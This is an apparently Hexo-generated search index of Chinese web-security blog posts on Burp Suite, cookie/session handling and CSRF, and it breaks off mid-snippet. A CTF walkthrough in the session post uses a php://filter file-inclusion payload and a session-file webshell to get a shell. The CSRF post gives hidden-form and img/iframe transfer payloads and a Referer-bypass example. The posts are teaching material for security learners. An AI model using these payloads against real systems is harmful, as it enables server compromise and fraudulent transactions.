<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Burp基本使用</title>
    <url>/2023/10/23/Burp/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h1><img src="/2023/10/23/Burp/image-20230718181609-0g0ao50.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718181624-6gn7lxl.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718181650-65end4k.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718181705-esf9iqn.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718183109-l2k4gcm.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718183130-ndb90g5.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718183224-djx963f.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718183241-m60xnhm.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718183310-xugdhvj.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718183326-znav3sn.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20230718183340-506f3wq.png" class="" title="image">​

<h2 id="FuzzDB-Burp组合拳"><a href="#FuzzDB-Burp组合拳" class="headerlink" title="FuzzDB+Burp组合拳"></a>FuzzDB+Burp组合拳</h2><img src="/2023/10/23/Burp/image-20231006202704-30je3n5.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20231006205555-70std4f.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20231006205613-xfnlhn1.png" class="" title="image">​

<img src="/2023/10/23/Burp/image-20231006205642-11qebtk.png" class="" title="image">

<p>成功获得flag</p>
<img src="/2023/10/23/Burp/image-20231006210048-u1n89zn.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/Burp/image-20231006205919-va3an3i.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>Cookie和Session机制</title>
    <url>/2023/10/23/Cookie%E5%92%8CSession/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="Cookie和Session"><a href="#Cookie和Session" class="headerlink" title="Cookie和Session"></a>Cookie和Session</h1><h1 id="1-使用Cookie来管理状态"><a href="#1-使用Cookie来管理状态" class="headerlink" title="1. 使用Cookie来管理状态"></a>1. 使用Cookie来管理状态</h1><p>HTTP 是无状态协议，说明它不能以状态来区分和管理请求和响应。也就是说，无法根据之前的状态进行本次的请求处理。<br>不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的CPU 及内存资源的消耗。从另一侧面来说，也正是因为HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</p>
<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-dde997503ed9d450e2f39042d53d4307_1440w.png" class="">​

<p>我们登录淘宝的时候首先要登录，我们看到了一个商品点进去，进行了页面跳转&#x2F;刷新，按照HTTP的无状态协议岂不是又要登录一次？<br>所以为了解决这个问题，Cookie诞生了，在保留无状态协议这个特征的同时又要解决类似记录状态的矛盾问题。Cookie 技术通过在请求和响应报文中写入Cookie 信息来控制客户端的状态。<br>Cookie 会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie 值后发送出去。<br>服务器端发现客户端发送过来的Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>
<ul>
<li>没有Cookie信息状态下的请求<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-85622297a93f493c891ffb90b67fd5e0_1440w.png" class="">​</li>
<li>第2次以后（存有Cookie信息状态）的请求</li>
</ul>
<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-1f49734871c5e2da2d264d28ac310a65_1440w.png" class="">​

<p>上图很清晰地展示了发生Cookie 交互的情景。<br>HTTP 请求报文和响应报文的内容如下（数字和图中对应）。<br>①请求报文（没有Cookie 信息的状态）</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET /reader/ HTTP/1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">*首部字段内没有Cookie的相关信息</span><br></pre></td></tr></table></figure>

<p>②响应报文（服务器端生成Cookie 信息）</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 12 Jul 2012 07:12:20 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br></pre></td></tr></table></figure>

<p>③请求报文（自动发送保存着的Cookie 信息）</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET /image/ HTTP/1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">Cookie: sid=1342077140226724</span><br></pre></td></tr></table></figure>

<h1 id="2-关于Cookie-的首部字段"><a href="#2-关于Cookie-的首部字段" class="headerlink" title="2. 关于Cookie 的首部字段"></a>2. 关于Cookie 的首部字段</h1><img src="/2023/10/23/Cookie%E5%92%8CSession/v2-ba2f99ae66a2f4731ac8a176f562aac7_1440w.png" class="">​

<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-b1147a2e2c3fbb6d6b46fdebda122ba3_1440w.png" class="">​

<h2 id="2-1-Set-Cookie"><a href="#2-1-Set-Cookie" class="headerlink" title="2.1 Set-Cookie"></a>2.1 Set-Cookie</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; ⇒</span><br><span class="line">path=/; domain=.hackr.jp;</span><br></pre></td></tr></table></figure>

<p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。下面的表格列举了Set-Cookie 的字段值。</p>
<h3 id="2-1-1Set-Cookie-字段的属性"><a href="#2-1-1Set-Cookie-字段的属性" class="headerlink" title="2.1.1Set-Cookie 字段的属性"></a>2.1.1Set-Cookie 字段的属性</h3><p><img src="https://pic4.zhimg.com/80/v2-d04615c640ec0b4fbb553cbc406eb057_1440w.webp">​</p>
<h3 id="2-1-2-expires-属性"><a href="#2-1-2-expires-属性" class="headerlink" title="2.1.2 expires 属性"></a>2.1.2 expires 属性</h3><p>Cookie 的expires 属性指定浏览器可发送Cookie 的有效期。当省略expires 属性时，Cookie仅在浏览器关闭之前有效。<br>另外，一旦Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除Cookie 的方法。但可通过覆盖已过期的Cookie，实现对客户端Cookie 的实质性删除操作。</p>
<h3 id="2-1-3-path-属性"><a href="#2-1-3-path-属性" class="headerlink" title="2.1.3 path 属性"></a>2.1.3 path 属性</h3><p>Cookie 的path 属性可用于限制指定Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p>
<h3 id="2-1-4-domain-属性"><a href="#2-1-4-domain-属性" class="headerlink" title="2.1.4 domain 属性"></a>2.1.4 domain 属性</h3><p>通过Cookie 的domain 属性指定的域名可做到与结尾匹配一致。比如， 当指定<a href="http://example.com/">http://example.com</a> 后， 除<a href="http://example.com/">http://example.com</a> 以外，<a href="https://link.zhihu.com/?target=http://www.example.com">Example Domain</a>或www2.example.com 等都可以发送Cookie。因此，除了针对具体指定的多个域名发送Cookie 之外，不指定domain 属性显得更安全。</p>
<h3 id="2-1-5-secure-属性"><a href="#2-1-5-secure-属性" class="headerlink" title="2.1.5 secure 属性"></a>2.1.5 secure 属性</h3><p>Cookie 的secure 属性用于限制Web 页面仅在HTTPS 安全连接时，才可以发送Cookie。发送Cookie 时，指定secure 属性的方法如下所示。<br>Set-Cookie: name&#x3D;value; secure<br>以上例子仅当在https ：&#x2F;&#x2F;<a href="https://link.zhihu.com/?target=http://www.example.com/">Example Domain</a>（HTTPS）安全连接的情况下才会进行Cookie 的回收。也就是说，即使域名相同时http : &#x2F;&#x2F;<a href="https://link.zhihu.com/?target=http://www.example.com/">Example Domain</a>（HTTP） 也不会发生Cookie 回收行为。当省略secure 属性时，不论HTTP 还是HTTPS，都会对Cookie 进行回收。</p>
<h3 id="2-1-6-HttpOnly-属性"><a href="#2-1-6-HttpOnly-属性" class="headerlink" title="2.1.6 HttpOnly 属性"></a>2.1.6 HttpOnly 属性</h3><p>Cookie 的HttpOnly 属性是Cookie 的扩展功能，它使JavaScript 脚本无法获得Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对Cookie 的信息窃取。<br>发送指定HttpOnly 属性的Cookie 的方法如下所示。<br>Set-Cookie: name&#x3D;value; HttpOnly<br>通过上述设置，通常从Web 页面内还可以对Cookie 进行读取操作。但使用JavaScript 的document.cookie 就无法读取附加HttpOnly 属性后的Cookie 的内容了。因此，也就无法在XSS 中利用JavaScript 劫持Cookie 了。<br>虽然是独立的扩展功能，但Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了防止XSS 而开发的。</p>
<h2 id="2-2-Cookie"><a href="#2-2-Cookie" class="headerlink" title="2.2 Cookie"></a>2.2 Cookie</h2><p>Cookie: status&#x3D;enable<br>首部字段Cookie 会告知服务器，当客户端想获得HTTP 状态管理支持时，就会在请求中包含从服务器接收到的Cookie。接收到多个Cookie 时，同样可以以多个Cookie 形式发送。</p>
<h1 id="3-Session-管理及Cookie-应用"><a href="#3-Session-管理及Cookie-应用" class="headerlink" title="3 Session 管理及Cookie 应用"></a>3 Session 管理及Cookie 应用</h1><h2 id="3-1-什么是Session"><a href="#3-1-什么是Session" class="headerlink" title="3.1 什么是Session"></a>3.1 什么是Session</h2><p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。Session 对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在 Session 对象中。</p>
<h2 id="3-2-通过Cookie来管理Session"><a href="#3-2-通过Cookie来管理Session" class="headerlink" title="3.2 通过Cookie来管理Session"></a>3.2 通过Cookie来管理Session</h2><p>基于表单认证的标准规范尚未有定论，一般会使用Cookie 来管理Session（会话）。<br>基于表单认证本身是通过服务器端的Web 应用，将客户端发送过来的用户ID 和密码与之前登录过的信息做匹配来进行认证的。<br>但鉴于HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用Cookie 来管理Session，以弥补HTTP 协议中不存在的状态管理功能。</p>
<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-0b02fa4a73a8072eb03cdf78270235e1_1440w.png" class="">​

<p>Session 管理及Cookie 状态管理</p>
<ul>
<li>步骤一：客户端把用户ID 和密码等登录信息放入报文的实体部分，通常是以POST 方法把请求发送给服务器。而这时，会使用HTTPS 通信来进行HTML 表单画面的显示和用户输入数据的发送。</li>
<li>步骤二：服务器会发放用以识别用户的Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与Session ID 绑定后记录在服务器端。<br>向客户端返回响应时，会在首部字段Set-Cookie 内写入Session ID（如PHPSESSID&#x3D;028a8c…）。<br>你可以把Session ID 想象成一种用以区分不同用户的等位号。然而，如果Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止Session ID 被盗，或被猜出。为了做到这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。<br>另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在Cookie 内加上httponly 属性。</li>
<li>步骤三：客户端接收到从服务器端发来的Session ID 后，会将其作为Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以Session ID 也随之发送到服务器。服务器端可通过验证接收到的Session ID 识别用户和其认证状态。</li>
</ul>
<p>除了以上介绍的应用实例，还有应用其他不同方法的案例。<br>另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。<br>通常，一种安全的保存方法是，先利用给密码加盐（salt）A 的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。</p>
<h2 id="3-Cookie和Session实战"><a href="#3-Cookie和Session实战" class="headerlink" title="3.Cookie和Session实战"></a>3.Cookie和Session实战</h2><img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205344-1cgjfgk.png" class="" title="image">​

<p>登录框随便输入后点击出现的两个链接任意都会发现URL处可能存在任意文件包含漏洞。</p>
<p><strong>该题伪协议没有过滤，直接读</strong>​<code>action.php</code>​看下源码是什么：</p>
<p><code>file=php://filter/read=convert.base64-encode/resource=action.php</code>​</p>
<p><strong>base64解码得到源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$name</span>)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=action.php?file=<span class="number">1</span>.txt&gt;my dairy&lt;/a&gt;</span><br><span class="line">&lt;a href=action.php?file=<span class="number">2</span>.txt&gt;my booklist&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>​ 如果网上搜索以下会发现session文件包含的漏洞，因为获取不到</strong>​<code>phpinfo</code>​信息所以不清楚session存储路径，网上都说的是<code>/var/lib/php/session</code>​是默认路径，但是在不设置任何东西通过Docker搭建的PHP环境下该路径默认不存放session而是在<code>/tmp</code>​目录下会生成临时文件。</p>
<p>接下来创建session文件，通过唯一可控的参数name，通过POST方式传递一个一句话木马。</p>
<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205651-jyb4vpk.png" class="" title="image">​

<p><strong>当通过POST方式传递name变量的值会被存入到session中，会在</strong>​<code>/tmp</code>​目录下存储session的值。session的文件名为：<code>sess+sessionid</code>​，<code>sessionid</code>​可以通过开发者模式获取。 首先获取sessionid，按【F12】后单击“网络”，在Cookie处找到sessionid值：kda17pk0n9q7raev72n8ss4316</p>
<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205729-qfqqsnb.png" class="" title="image">​

<p>拼接?file&#x3D;&#x2F;tmp&#x2F;sess_kda17pk0n9q7raev72n8ss4316</p>
<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009210245-6fcojr9.png" class="" title="image">

<p>蚁剑成功getshell。</p>
<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009210318-00e1ae2.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>CSRF跨站请求伪造漏洞</title>
    <url>/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="CSRF跨站请求伪造漏洞"><a href="#CSRF跨站请求伪造漏洞" class="headerlink" title="CSRF跨站请求伪造漏洞"></a>CSRF跨站请求伪造漏洞</h1><h1 id="漏洞相关信息"><a href="#漏洞相关信息" class="headerlink" title="漏洞相关信息"></a>漏洞相关信息</h1><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>受害者在未退出重要网站的情况下出于好奇心或者其他心理访问了某个恶意链接，而这个恶意链接指向某个网站，比如受害者刚刚登录不久的银行网站，就可以在受害者不知情的情况下进行转账交易。<br>当然，这是个人理解，官方一点的如下</p>
<blockquote>
<p>主要成因：浏览器cookie不过期，不关闭浏览器或退出登录，都会默认为已登录状态<br>次要成因：对请求合法性验证不严格</p>
</blockquote>
<h3 id="漏洞定义"><a href="#漏洞定义" class="headerlink" title="漏洞定义"></a>漏洞定义</h3><img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020094111-61t2940.png" class="" title="image">​

<p>CSRF，即<code>Cross Site Request Forgery</code>​，译为跨站点请求伪造，看起来似乎与XSS(跨站脚本攻击)是相像的，但两者实际上大相径庭，XSS是获取到网站信任用户的具体信息，进行攻击，而而CSRF则通过伪装成受信任用户进行攻击。对CSRF用一个简单的事例来进行讲解</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1、老八访问www.bank.com,登录后存入100元</span><br><span class="line">2、老八存过钱后未关闭网站，浏览其他网站时发现有一个名字为3060显卡100元处理的广告，老八点击访问</span><br><span class="line">3、访问后发现什么也没有，老八大失所望，悻悻的离开网站</span><br><span class="line">4、老八再次查看银行时，发现刚刚的钱被转走了</span><br></pre></td></tr></table></figure>

<p>这个过程是怎么实现的呢，我们看一下这个链接的内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.bank.com&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以发现当访问它的时候，它自动进行了一个表单的提交，将100块钱进行了转出，而表面是什么也没有的（这个例子存在部分小问题，比如代码中没以有具体写转向了哪里，但不影响整体理解），这个时候老八刚刚存入的100就不翼而飞了。流程图的话，如下所示</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020140733-bwvt85r.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020094430-eh2aiak.png" class="" title="image">

<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><blockquote>
<p>1、篡改目标网站上的用户数据<br>2、盗取用户隐私数据<br>3、作为其他攻击向量的辅助攻击手法<br>4、 传播CSRF蠕虫</p>
</blockquote>
<h1 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h1><h3 id="GET上传"><a href="#GET上传" class="headerlink" title="GET上传"></a>GET上传</h3><p>针对GET类型，这个比较简单，我们只需要构造一个虚假链接，在里面添上我们的payload即可，构造如下所示<br>假设银行转账界面为877.php，代码如下所示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$money</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;向 <span class="subst">$user</span> 转账成功，金额为 <span class="subst">$money</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时攻击者构造恶意界面为1.php，具体代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;http://127.0.0.1:8011/csrf/877.php?user=hacker&amp;money=100&quot;</span>&gt;杀马特团长的故事&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>此时我们访问1.php</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020144040-jfj1nun.png" class="" title="image">​

<p>当受害者出于好奇访问此链接时</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020144101-fb70596.png" class="" title="image">​

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;http://bank.com/?money=100&amp;user=hacker&quot;</span> style=<span class="string">&quot;display:none;&quot;</span>/&gt;</span><br><span class="line"><span class="comment">//这里的style=&quot;display:none;&quot;指的是隐藏元素</span></span><br></pre></td></tr></table></figure>

<h3 id="POST上传"><a href="#POST上传" class="headerlink" title="POST上传"></a>POST上传</h3><p>对于POST类型上传的，我们这个时候需要构造一个表单来进行提交，这个相对GET是比较麻烦的，不过我们这里可以简化一下，使用burpsuite工具来迅速构造出对应的表单，举例如下<br>银行转账界面仍877.php，其代码如下所示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$money</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;向 <span class="subst">$user</span> 转账成功，金额为 <span class="subst">$money</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们访问这个界面，自己先赋值一下，获取到参数，然后抓包</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020144641-hqb3txe.png" class="" title="image">​

<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020144921-q2oj1yi.png" class="" title="image">​

<p>构造poc</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020145123-fjo98jn.png" class="" title="image">

<p>此时当用户点击这个恶意链接时，界面如下：</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020145235-e7mj4i9.png" class="" title="image">​

<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020145300-7qjumzs.png" class="" title="image">​

<h3 id="token验证"><a href="#token验证" class="headerlink" title="token验证"></a>token验证</h3><p>当随机生成token时，有两种方式，一种是通过xss获取当前界面的token，与此同时构造恶意链接，另一种是直接利用burpsuite的CSRF token插件来进行自动更新token</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/image-20231020145444-d08re2n.png" class="" title="image">​

<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>一般对于GET型，大多是利用标签来进行攻击，这个方式是有效且快捷的，因此我们这里先大致罗列一下常用的标签<br>而针对POST型的话，一般都是构造表单，这个的话我们就利用bp的CSRF PoC就可以生成对应的表单。<br>下面来大致讲解一下GET型时可以利用的标签</p>
<h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><p>超链接标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a&gt;标签：&lt;a href=<span class="string">&quot;http://xxx.com/?user=xx&amp;money=xx&quot;</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>img标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;img&gt;标签: &lt;img src=<span class="string">&quot;http://xxx.com/?user=xx&amp;money=xx&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>iframe标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;iframe&gt;标签：&lt;iframe src=<span class="string">&quot;http://xxx.com/?user=xx&amp;moeny=xx&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>由于前两个在之前示例中已经讲过，所以这里不再举例子，这里的话讲解一下iframe标签，<br>先创建一个银行界面（GET型），命名为877.php，内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$money</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;向 <span class="subst">$user</span> 转账成功，金额为 <span class="subst">$money</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时我们构造恶意链接，命名为1.php，内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;iframe src=<span class="string">&quot;http://127.0.0.1:8080/html/877.php?user=hacker&amp;money=1000&quot;</span> style= <span class="string">&quot;display:none&quot;</span>;&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>当我们访问1.php的时候发现全是空白，这是因为<code>style= &quot;display:none&quot;;</code>​隐藏了元素，当我们把这个去掉的时候<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149239_62f3ddf7a8e6c451dcb6f.jpeg" class="" title="在这里插入图片描述"><br>可以发现成功转账了</p>
<h1 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h1><h3 id="绕过Referer检测"><a href="#绕过Referer检测" class="headerlink" title="绕过Referer检测"></a>绕过Referer检测</h3><p>有时候可能会遇到检测Referer的情况，这个时候也就要求是同域的，不是同域的话就不符合条件，就会被PASS掉，什么是同域呢，简单的说一下，假设你的ip为<code>124.138.124.168</code>​，此时检测Referer头时，它就会是你的ip加上你访问的文件名，这时候其实也就是要求你的ip必须是服务端的才行。但是呢，道高一尺魔高一丈，当检验的不是那么严谨的时候，这个Referer也是可以进行绕过的。示例如下<br>我们的银行转账界面877.php，内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="variable">$user</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span 